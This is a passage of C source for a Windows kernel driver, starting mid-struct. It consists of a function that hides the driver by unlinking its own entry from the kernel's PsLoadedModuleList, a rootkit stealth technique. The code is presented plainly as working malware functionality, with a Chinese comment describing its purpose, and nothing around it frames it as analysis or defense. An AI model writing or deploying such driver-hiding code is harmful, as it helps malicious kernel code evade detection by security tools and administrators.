    UNICODE_STRING BaseDllName;
} MY_LDR_ENTRY, *PMY_LDR_ENTRY;

// 从 PsLoadedModuleList 摘自己的 LDR 项
void HideDriverFromModuleList(PDRIVER_OBJECT DriverObject) {
    PLIST_ENTRY head = &PsLoadedModuleList;
    PLIST_ENTRY cur = head->Flink;
    while (cur != head) {
        PMY_LDR_ENTRY e = CONTAINING_RECORD(cur, MY_LDR_ENTRY, InLoadOrderLinks);
        if (e->DllBase == DriverObject->DriverStart) {
            RemoveEntryList(&e->InLoadOrderLinks);
            RemoveEntryList(&e->InMemoryOrderLinks);
            RemoveEntryList(&e->InInitializationOrderLinks);
            e->InLoadOrderLinks.Flink = e->InLoadOrderLinks.Blink = &e->InLoadOrderLinks;
            break;
        }
        cur = cur->Flink;
    }
}

